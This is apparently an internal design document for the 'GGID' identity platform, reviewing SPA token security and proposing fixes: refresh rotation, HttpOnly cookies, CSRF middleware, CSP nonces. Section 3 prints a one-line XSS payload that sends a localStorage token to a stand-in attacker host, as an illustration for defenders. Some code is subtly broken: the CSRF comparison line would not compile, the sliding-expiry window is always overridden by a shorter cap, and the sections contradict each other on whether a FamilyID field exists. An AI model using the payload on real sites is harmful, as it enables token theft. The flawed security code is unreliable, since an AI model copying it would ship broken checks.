# SPA Authentication Security for IAM Systems

> **Scope**: Silent refresh, refresh token rotation, token storage, CSRF double-submit,
> XSS mitigation via CSP, and a gap analysis of GGID's current SPA auth surface.
>
> **Audience**: GGID platform engineers, security architects, frontend developers.

---

## Table of Contents

1. [Silent Refresh Pattern](#1-silent-refresh-pattern)
2. [Refresh Token Rotation for Browsers](#2-refresh-token-rotation-for-browsers)
3. [HttpOnly Cookie vs localStorage Storage](#3-httponly-cookie-vs-localstorage-storage)
4. [CSRF Double-Submit Pattern](#4-csrf-double-submit-pattern)
5. [XSS Mitigation for SPAs](#5-xss-mitigation-for-spas)
6. [GGID Hosted Login Page Analysis](#6-ggid-hosted-login-page-analysis)
7. [Gap Analysis & Recommendations](#7-gap-analysis--recommendations)

---

## 1. Silent Refresh Pattern

### How It Works

In a SPA, the access token has a short lifetime (5-15 minutes). When it expires,
the SPA needs to obtain a new one without interrupting the user. Two strategies:

| Strategy | Mechanism | Pro | Con |
|----------|-----------|-----|-----|
| **Iframe silent refresh** | Hidden iframe loads `/oauth/authorize?prompt=none` + session cookie | No JS token handling | CORS/SameSite complexity |
| **Refresh token grant** | POST `/oauth/token` with `grant_type=refresh_token` | Simple, standard | Refresh token must be stored securely |

GGID's OAuth service already supports the refresh token grant at
`/oauth/token` (server.go line 336-343). The token endpoint correctly rotates
the refresh token on each use (oauth_service.go line 690-761).

### Race Condition: Concurrent Refresh Requests

When multiple browser tabs share the same token, they may attempt to refresh
simultaneously. This causes:

- The first request succeeds; the old refresh token is invalidated.
- The second request fails with "invalid refresh token" → reuse detection triggers
  → **all tokens for the client get revoked**.

**Mitigation**: Coordinate refresh across tabs using a `BroadcastChannel` in the
browser, and use a server-side refresh lock on the same `refresh_token` hash.

### Go Code: Refresh Endpoint with Sliding Expiration

GGID's current `RefreshToken` method uses a fixed 30-day expiry. Sliding
expiration extends the lifetime on each refresh, but caps it to a maximum
absolute lifetime (preventing indefinite sessions):

```go
// RefreshTokenSliding issues new tokens with sliding-window expiration.
// maxAbsoluteLifetime enforces a hard ceiling (e.g., 7 days from initial login).
func (s *OAuthService) RefreshTokenSliding(
	ctx context.Context,
	req *RefreshTokenRequest,
) (*TokenResponse, error) {
	// ... existing client lookup + secret verification (omitted) ...

	// 4. Look up the refresh token record.
	tokenHash := hashTokenSHA256(req.RefreshToken)
	record, err := s.tokenRepo.GetRefreshToken(ctx, req.TenantID, tokenHash)
	if err != nil || record == nil {
		return nil, errors.Unauthenticated("invalid refresh token")
	}

	// 5. Reuse detection — atomic mark-and-check.
	if record.Used || record.Revoked {
		// Revoke the entire token family.
		_ = s.tokenRepo.RevokeRefreshTokenFamily(ctx, req.TenantID, record.FamilyID)
		return nil, errors.Unauthenticated("refresh token reuse detected")
	}

	// 6. Atomically mark old token as used (prevents concurrent refresh races).
	affected, err := s.tokenRepo.MarkUsedIfNotUsed(ctx, tokenHash)
	if err != nil || !affected {
		// Another request won the race. Return reuse error to force re-login.
		return nil, errors.Unauthenticated("refresh token already used")
	}

	// 7. Sliding expiration: extend by slidingWindow, capped at maxAbsolute.
	const slidingWindow = 30 * 24 * time.Hour
	const maxAbsolute = 7 * 24 * time.Hour // 7 days from initial issue
	newExpiry := time.Now().Add(slidingWindow)
	if time.Until(record.InitialIssueTime.Add(maxAbsolute)) < slidingWindow {
		newExpiry = record.InitialIssueTime.Add(maxAbsolute)
	}

	// 8. Issue new access token + rotated refresh token.
	accessToken, expiresIn, _ := s.issueAccessToken(record.UserID, req.TenantID, client.ClientID)
	newRefresh, _ := crypto.GenerateRandomToken(32)

	newRecord := &domain.RefreshTokenRecord{
		ID:               uuid.New(),
		FamilyID:         record.FamilyID, // same family for reuse detection
		TenantID:         req.TenantID,
		ClientID:         client.ID,
		UserID:           record.UserID,
		TokenHash:        hashTokenSHA256(newRefresh),
		Scope:            req.Scope,
		InitialIssueTime: record.InitialIssueTime,
		ExpiresAt:        newExpiry,
	}
	_ = s.tokenRepo.StoreRefreshToken(ctx, newRecord)

	return &TokenResponse{
		AccessToken:  accessToken,
		TokenType:    "Bearer",
		ExpiresIn:    expiresIn,
		RefreshToken: newRefresh,
	}, nil
}
```

### Backoff Strategy (Client-Side)

When a refresh fails due to a transient network error, the SPA should retry
with exponential backoff (not on 400-level errors):

```typescript
// Client-side: retry refresh with backoff (no retry on 4xx)
async function refreshTokenWithBackoff(refreshToken: string): Promise<TokenResponse> {
  const maxRetries = 3;
  for (let i = 0; i < maxRetries; i++) {
    try {
      const resp = await fetch('/oauth/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          grant_type: 'refresh_token',
          refresh_token: refreshToken,
          client_id: CLIENT_ID,
        }),
      });
      if (resp.ok) return resp.json();
      if (resp.status >= 400 && resp.status < 500) {
        // Non-retryable: token invalid, reuse detected, etc.
        throw new Error(`refresh failed: ${resp.status}`);
      }
    } catch (e) {
      if (i === maxRetries - 1) throw e;
    }
    await new Promise(r => setTimeout(r, Math.pow(2, i) * 1000)); // 1s, 2s, 4s
  }
  throw new Error('refresh failed after retries');
}
```

---

## 2. Refresh Token Rotation for Browsers

### Why Rotation Matters

Browser-based refresh tokens are high-value targets for XSS attacks. Unlike
native apps (RFC 8252), browsers cannot store secrets securely. Rotation
mitigates theft by ensuring a stolen refresh token is single-use:

1. Attacker steals refresh token T1.
2. Attacker uses T1 → gets new token T2; legitimate token T1 is invalidated.
3. Legitimate app tries T1 → reuse detected → **entire family revoked**.

This means the attacker only gets one use, and the victim is alerted (forced
re-authentication).

### RFC 9700 BCP Recommendations

RFC 9700 (OAuth 2.0 Security Best Current Practice) recommends:

- **Rotate refresh tokens on every use** (already implemented in GGID).
- **Detect reuse**: If a previously-used token is presented, revoke all tokens
  in the family.
- **Prefer sender-constrained tokens** (DPoP/mTLS) for confidential clients.
- **Short-lived access tokens** (5-15 min) to limit damage window.
- **No implicit flow** for browser SPAs — use authorization code + PKCE.

### Token Family Tracking

Each initial refresh token creates a **family**. All rotated tokens share the
same `family_id`. When reuse is detected, the entire family is revoked:

```go
// RefreshTokenRecord stores family metadata for reuse detection.
type RefreshTokenRecord struct {
	ID               uuid.UUID
	FamilyID         uuid.UUID  // groups all tokens from the same initial login
	TenantID         uuid.UUID
	ClientID         uuid.UUID
	UserID           uuid.UUID
	TokenHash        string     // SHA-256 of plaintext token (never store plaintext)
	Used             bool       // rotated away
	Revoked          bool       // explicitly revoked
	Scope            []string
	InitialIssueTime time.Time  // for sliding expiration ceiling
	ExpiresAt        time.Time
}

// TokenFamilyRepo tracks families for batch revocation.
type TokenFamilyRepo interface {
	CreateFamily(ctx context.Context, familyID, tenantID uuid.UUID) error
	AddToFamily(ctx context.Context, familyID uuid.UUID, record *RefreshTokenRecord) error
	RevokeFamily(ctx context.Context, tenantID, familyID uuid.UUID) error
	IsFamilyRevoked(ctx context.Context, tenantID, familyID uuid.UUID) (bool, error)
}

// CheckReuseAndRevoke implements atomic reuse detection.
// If the presented token was already used, revoke the entire family.
func (s *OAuthService) CheckReuseAndRevoke(
	ctx context.Context,
	tenantID uuid.UUID,
	tokenHash string,
	familyRepo TokenFamilyRepo,
) error {
	record, err := s.tokenRepo.GetRefreshToken(ctx, tenantID, tokenHash)
	if err != nil {
		return errors.Unauthenticated("invalid refresh token")
	}

	// If family is already revoked, reject immediately.
	revoked, _ := familyRepo.IsFamilyRevoked(ctx, tenantID, record.FamilyID)
	if revoked {
		return errors.Unauthenticated("token family revoked due to reuse")
	}

	// If this specific token was already used, revoke the family.
	if record.Used {
		_ = familyRepo.RevokeFamily(ctx, tenantID, record.FamilyID)
		// Emit security audit event.
		s.audit.Publish(ctx, audit.Event{
			Type:   "refresh_token_reuse_detected",
			Sub:    record.UserID.String(),
			Family: record.FamilyID.String(),
		})
		return errors.Unauthenticated("refresh token reuse detected — family revoked")
	}

	return nil
}
```

### GGID's Current State

GGID already implements reuse detection in `RefreshToken()` (oauth_service.go
line 717-721):

```go
// 5. Reuse detection: if the token was already used or revoked, revoke ALL tokens.
if record.Used || record.Revoked {
    _ = s.tokenRepo.RevokeAllRefreshTokens(ctx, req.TenantID, client.ID)
    return nil, errors.Unauthenticated("refresh token reuse detected — all tokens revoked")
}
```

**Gap**: GGID revokes **all** tokens for the client, not just the family. If a
user has multiple sessions on the same client, one compromised token revokes
all sessions. Family-scoped revocation is more precise.

---

## 3. HttpOnly Cookie vs localStorage Storage

### Security Tradeoffs

| Storage | XSS Exposure | CSRF Exposure | Notes |
|---------|-------------|---------------|-------|
| `localStorage` | **High** — any JS can read | None | Simplest, most dangerous |
| `HttpOnly` cookie | **None** — JS cannot read | **High** — cookie auto-sent | Requires CSRF defense |
| `sessionStorage` | **High** — any JS can read | None | Cleared on tab close |
| In-memory only | **Low** — lost on refresh | None | Best XSS defense, poor UX |

### Why localStorage Is Vulnerable

Any XSS payload can exfiltrate tokens from localStorage:

```javascript
// Attacker XSS payload (1 line):
fetch('https://evil.example/steal?t=' + localStorage.getItem('access_token'))
```

Since GGID access tokens contain `tenant_id`, `sub`, and custom claims, a stolen
token gives the attacker full API access until expiry (15 minutes).

### Why HttpOnly Cookies Mitigate XSS (But Need CSRF Defense)

An `HttpOnly` cookie is invisible to JavaScript. Even if XSS executes, the
attacker cannot read the token. However, the browser **automatically** sends
the cookie with every request — including cross-site requests. This enables
CSRF.

### Hybrid Approach: HttpOnly Cookie + CSRF Token

The recommended pattern for IAM systems:

1. **Access token**: Stored in memory only (React state / Pinia store). Lost on
   refresh, but the SPA can silently re-acquire it.
2. **Refresh token**: Stored in `HttpOnly; Secure; SameSite=Strict` cookie.
3. **CSRF token**: Stored in a non-HttpOnly cookie, read by JS, sent as a
   custom header.

```go
// SetAuthCookies sets the refresh token and CSRF token in cookies.
// The refresh token is HttpOnly (inaccessible to JS).
// The CSRF token is readable by JS but must be echoed back as a header.
func SetAuthCookies(w http.ResponseWriter, refreshToken, csrfToken string) {
	// Refresh token: HttpOnly, Secure, SameSite=Strict
	http.SetCookie(w, &http.Cookie{
		Name:     "ggid_refresh_token",
		Value:    refreshToken,
		Path:     "/oauth/token",   // scoped to token endpoint only
		MaxAge:   30 * 24 * 3600,   // 30 days
		HttpOnly: true,
		Secure:   true,             // HTTPS only
		SameSite: http.SameSiteStrictMode,
	})

	// CSRF token: readable by JS, scoped to same origin
	http.SetCookie(w, &http.Cookie{
		Name:     "ggid_csrf",
		Value:    csrfToken,
		Path:     "/",
		MaxAge:   30 * 24 * 3600,
		HttpOnly: false,            // JS needs to read this
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
	})
}

// ReadRefreshTokenFromCookie extracts the refresh token from the cookie.
// This replaces reading from the request body or form data.
func ReadRefreshTokenFromCookie(r *http.Request) string {
	cookie, err := r.Cookie("ggid_refresh_token")
	if err != nil {
		return ""
	}
	return cookie.Value
}
```

### Why SameSite=Strict for Refresh Token

The refresh endpoint (`/oauth/token` with `grant_type=refresh_token`) is a
state-changing operation. `SameSite=Strict` prevents the cookie from being sent
on cross-site requests, providing strong CSRF protection. The CSRF token layer
is a defense-in-depth measure.

---

## 4. CSRF Double-Submit Pattern

### How Double-Submit Works

1. Server sets a random CSRF token in a cookie (`ggid_csrf`).
2. JavaScript reads the cookie and sends the value as a custom header
   (`X-CSRF-Token`) on every state-changing request.
3. Server validates: cookie value == header value.

This works because:
- An attacker's cross-site request cannot read the CSRF cookie (same-origin
  policy).
- The browser sends the cookie automatically, but the attacker cannot inject
  the matching header.

### Why SameSite=Lax Is Not Enough

`SameSite=Lax` allows cookies on top-level GET navigations. If any
state-changing operation uses GET (anti-pattern, but common in legacy systems),
it is vulnerable. Additionally, `SameSite=Lax` does not protect against
subdomain attacks or browser bugs.

### Go Middleware: Double-Submit Validation

```go
// CSRFMiddleware validates the double-submit CSRF token.
// It checks that the X-CSRF-Token header matches the ggid_csrf cookie value.
// Apply this to all state-changing methods (POST, PUT, PATCH, DELETE).
func CSRFMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Only validate state-changing methods.
		switch r.Method {
		case http.MethodGet, http.MethodHead, http.MethodOptions:
			next.ServeHTTP(w, r)
			return
		}

		cookieToken := ""
		if c, err := r.Cookie("ggid_csrf"); err == nil {
			cookieToken = c.Value
		}

		headerToken := r.Header.Get("X-CSRF-Token")

		// Both must be present and equal.
		if cookieToken == "" || headerToken == "" {
			http.Error(w, `{"error":"missing CSRF token"}`, http.StatusForbidden)
			return
		}

		if !subtle.ConstantTimeCompare([]byte(cookieToken), []byte(headerToken)) == 1 {
			http.Error(w, `{"error":"invalid CSRF token"}`, http.StatusForbidden)
			return
		}

		next.ServeHTTP(w, r)
	})
}

// GenerateCSRFToken creates a cryptographically random CSRF token.
func GenerateCSRFToken() (string, error) {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(b), nil
}
```

### Integration with GGID Gateway

GGID's gateway (router.go) currently applies `CORS`, `RequestID`, `PanicRecovery`,
and `TenantResolver` middleware. CSRF middleware should be inserted between
`RequestID` and `TenantResolver`:

```go
// In router.go Handler():
handler := middleware.TenantResolver(gw.cfg.DomainSuffix)(inner)
handler = middleware.CSRFMiddleware(handler)  // <-- add here
handler = middleware.RequestLogger(logger)(handler)
handler = middleware.RequestID(handler)
handler = middleware.CORS(handler)
handler = middleware.PanicRecovery(logger)(handler)
```

---

## 5. XSS Mitigation for SPAs

### Content Security Policy for SPA Auth Flows

A strong CSP is the primary XSS defense for SPAs. GGID's
`security_headers.go` currently sets a minimal CSP:

```go
// Current (security_headers.go line 38):
CSP: "default-src 'self'; frame-ancestors 'none'"
```

For SPA auth flows, this should be tightened to prevent inline scripts and
restrict token-leaking exfiltration:

```go
// Recommended CSP for GGID's hosted login page and SPA console:
func SPAAuthCSP(nonce string) string {
	return strings.Join([]string{
		"default-src 'self'",
		"script-src 'self' 'nonce-" + nonce + "'",
		"style-src 'self' 'unsafe-inline'",         // styled-components needs this
		"img-src 'self' data: https:",               // avatars
		"connect-src 'self'",                        // API calls
		"frame-ancestors 'none'",                    // prevent clickjacking
		"form-action 'self'",                        // prevent form exfiltration
		"base-uri 'self'",                           // prevent base hijack
		"object-src 'none'",                         // no plugins/flash
	}, "; ")
}
```

### CSP Nonce Generation in Go

```go
// CSPNonceMiddleware generates a per-request nonce and injects it into
// both the CSP header and the request context (for use in templates).
func CSPNonceMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		nonceB := make([]byte, 16)
		if _, err := rand.Read(nonceB); err != nil {
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}
		nonce := base64.StdEncoding.EncodeToString(nonceB)

		w.Header().Set("Content-Security-Policy", SPAAuthCSP(nonce))
		r = r.WithContext(context.WithValue(r.Context(), CSPNonceKey, nonce))
		next.ServeHTTP(w, r)
	})
}

// CSPNonceFromContext extracts the nonce for use in HTML templates.
func CSPNonceFromContext(ctx context.Context) string {
	v, _ := ctx.Value(CSPNonceKey).(string)
	return v
}
```

### Subresource Integrity (SRI)

Third-party scripts (analytics, error reporting, etc.) should include SRI
hashes so a compromised CDN cannot inject malicious code:

```html
<script src="https://cdn.example.com/analytics.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

### Framework Auto-Escaping

- **React**: Auto-escapes JSX content. Avoid `dangerouslySetInnerHTML`.
- **Angular**: Auto-escapes bindings. Avoid `[innerHTML]` without sanitization.
- **Vue**: Auto-escapes `{{ }}`. Avoid `v-html` unless sanitized.

GGID's Next.js console should enforce `react/no-danger` in ESLint.

---

## 6. GGID Hosted Login Page Analysis

### Current Architecture

GGID serves hosted login/register pages from the **gateway** (router.go lines
198-215):

```go
// Hosted login page (served by Gateway — any app can redirect here)
if r.URL.Path == "/login" {
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    _, _ = w.Write([]byte(hostedLoginHTML))
    return
}
```

These are static HTML templates (templates.go) served directly by the gateway.

### Token Endpoint Pattern

The OAuth `/oauth/token` endpoint (server.go line 293-396) correctly:
- Sets `Cache-Control: no-store` and `Pragma: no-cache` (line 393-394).
- Supports `refresh_token` grant with rotation + reuse detection.
- Enforces PKCE for public clients.

### Gateway JWT Validation

The gateway applies JWT auth middleware on all non-public paths (router.go line
330-334). Public paths include `/api/v1/auth/login`, `/api/v1/auth/refresh`,
`/oauth/`, and the hosted pages.

### Cookie/Header Handling

The gateway **does not** set any cookies. All token transport is via the
`Authorization: Bearer` header. This means:
- The SPA must store the access token in JS-accessible memory (localStorage or
  in-memory).
- The refresh token is returned in the JSON response body — the SPA must store
  it.

### Session Management

The gateway has a `SessionManager` (session.go) backed by Redis. It validates
`session_id` from JWT claims or the `X-Session-ID` header against Redis. This
provides server-side session revocation but does not address token storage in
the browser.

### Identified Gaps

| # | Gap | Severity | Detail |
|---|-----|----------|--------|
| 1 | No HttpOnly cookie for refresh tokens | **High** | Refresh token returned in JSON body; SPA must store in localStorage (XSS-vulnerable) |
| 2 | No CSRF protection on token endpoint | **Medium** | `/oauth/token` accepts form POST without CSRF validation |
| 3 | No CSP nonce on hosted login pages | **Medium** | Static HTML templates lack nonce-based CSP; inline scripts are not protected |
| 4 | No family-scoped token revocation | **Medium** | Reuse detection revokes ALL client tokens, not just the compromised family |
| 5 | No `prompt=none` silent refresh support | **Low** | SPA must use refresh token grant (acceptable, but no iframe fallback) |
| 6 | Hosted login pages served without security headers | **Medium** | The `/login` handler bypasses `SecurityHeadersConfigurable` middleware |
| 7 | No `SameSite` cookie attributes anywhere | **Medium** | Cookie infrastructure exists (session.go) but SameSite is never set |

---

## 7. Gap Analysis & Recommendations

### What GGID Currently Lacks

1. **Token storage strategy**: No guidance or infrastructure for secure
   browser-side token storage. The current flow returns all tokens as JSON,
   forcing the SPA to manage storage.

2. **Cookie-based token delivery**: The OAuth service returns refresh tokens in
   the response body. There is no option to set them as HttpOnly cookies.

3. **CSRF defense**: The gateway has no CSRF middleware. The token endpoint
   accepts cross-site form POSTs without validation.

4. **CSP enforcement on auth pages**: Hosted login/register pages bypass the
   `SecurityHeadersConfigurable` middleware chain. They are served with only
   `Content-Type: text/html`.

5. **Token family tracking**: The `RefreshTokenRecord` has no `FamilyID` field.
   Reuse detection revokes all client tokens indiscriminately.

### Implementation Roadmap

#### Action 1: HttpOnly Cookie for Refresh Tokens
**Effort**: 2-3 days

- Add a `cookie_mode` parameter to the token endpoint.
- When `cookie_mode=true`, set the refresh token as an `HttpOnly; Secure;
  SameSite=Strict` cookie instead of returning it in the JSON body.
- Scope the cookie path to `/oauth/token` only.
- Modify the gateway's `/login` handler to set the cookie after successful
  authentication.

```go
// In OAuth token endpoint response handler:
if r.FormValue("cookie_mode") == "true" {
    http.SetCookie(w, &http.Cookie{
        Name:     "ggid_refresh_token",
        Value:    resp.RefreshToken,
        Path:     "/oauth/token",
        MaxAge:   30 * 24 * 3600,
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
    })
    resp.RefreshToken = "" // don't expose in JSON body
}
```

#### Action 2: CSRF Double-Submit Middleware
**Effort**: 1-2 days

- Implement `CSRFMiddleware` (see section 4 code).
- Apply to all non-GET routes in the gateway middleware chain.
- Generate CSRF token at login and set as a non-HttpOnly cookie.
- Frontend reads cookie, sends as `X-CSRF-Token` header on all mutations.

#### Action 3: Family-Scoped Refresh Token Revocation
**Effort**: 2-3 days

- Add `FamilyID uuid.UUID` to `RefreshTokenRecord` (domain/models.go).
- Create `RefreshTokenFamily` table or Redis set.
- Replace `RevokeAllRefreshTokens` with `RevokeRefreshTokenFamily`.
- Emit audit event on reuse detection.

#### Action 4: CSP Nonce on Hosted Auth Pages
**Effort**: 1 day

- Add `CSPNonceMiddleware` to the gateway middleware chain.
- Update hosted login/register templates (templates.go) to use the nonce:
  `<script nonce="{{.Nonce}}">...</script>`.
- Serve auth pages through the middleware chain (currently bypassed).

#### Action 5: SPA Token Storage Library
**Effort**: 2-3 days

- Create a thin TypeScript SDK (`sdk/node/` or `console/lib/auth.ts`):
  - Stores access token in memory only.
  - Reads refresh token from HttpOnly cookie (transparent).
  - Implements silent refresh with `BroadcastChannel` tab coordination.
  - Handles reuse-detection errors by forcing re-login.

### Summary

GGID's OAuth service has solid fundamentals: PKCE enforcement, refresh token
rotation, and reuse detection. The main gaps are in the **browser delivery
layer** — tokens are returned as JSON without HttpOnly cookie options, there is
no CSRF defense, and the hosted auth pages bypass security headers. Closing
these gaps requires ~8-12 days of focused work across the OAuth service and
gateway, with no breaking changes to existing API clients (cookie mode is
opt-in).

---

## References

- [RFC 9700] OAuth 2.0 Security Best Current Practice
- [RFC 6749] The OAuth 2.0 Authorization Framework (Section 10.4-10.6)
- [RFC 7009] OAuth 2.0 Token Revocation
- [RFC 8252] OAuth 2.0 for Native Apps
- [OIDC Session Management 1.0] draft-ietf-oauth-session-management
- OWASP Cheat Sheet: Cross-Site Request Forgery Prevention
- OWASP Cheat Sheet: Content Security Policy
